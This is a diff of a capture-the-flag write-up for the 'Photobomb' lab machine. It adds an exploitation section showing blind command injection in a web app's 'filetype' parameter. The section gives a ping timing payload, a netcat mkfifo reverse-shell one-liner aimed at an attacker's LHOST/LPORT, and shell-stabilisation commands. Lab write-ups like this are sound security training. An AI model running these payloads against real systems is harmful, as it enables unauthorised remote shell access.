@@ -1,4 +1,4 @@
-# Box: Photobomb
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c6cb38c5-2e6f-4db3-bf23-231b77aa3333)![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dab24944-a8dc-45b0-a3ef-b2807ca7e47e)# Box: Photobomb
 # Level: Easy
 # OS: Linux
 <hr>
@@ -83,8 +83,58 @@ Clicking on the "click here" directs you to the ```/printer``` directory which r
 
 nice nice, we are logged in
 
+This webpage just allows us to download an image so we can print it
+
+Lets try to download an image, but this time we'll capture the request using burpsuite and send it over to burp repeater
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/adccd678-580d-4ebd-9e25-a2a150a12ae9)
+
+We can see there are 3 parameters ```photo```, ```filetype``` and ```dimensions```
+
+The parameter ```filetype``` is actually vulnerable to blind command injection. Lets exploit this
 
 
+
+# Exploitation
+
+Lets try to cause a 10 seconds delay
+
+payload:```;ping+-c+10+127.0.0.1```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4a92c2c6-bbb5-4a88-bc71-daad095fbdaf)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/19fb9a4c-e271-4ca0-a6a4-e23e4f6a291d)
+
+This actually caused a 10 secinds delay
+
+Lets spawn a reverse shell with this
+
+payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f```
+
+Ensure you edit the ```LHOST``` and ```LPORT```, also ensure it is url encoded
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/980d47d2-c705-47da-911b-bd4dc92a770f)
+
+Checking my netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c0f833af-09a2-49ae-8b5c-6009aed9ba3e)
+
+nice nice, lets stabilize our shell
+
+```
+python3 -c "import pty;pty.spawn('/bin/bash')"
+ctrl + z (To Background)
+stty raw -echo && fg
+export TERM=xterm
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7e1ac6db-6b79-4530-ab1a-c637e0dd4a93)
+
+We can go ahead now to escalate our privileges
+
+
+
+
+# Privilege Escalation
 
 
 
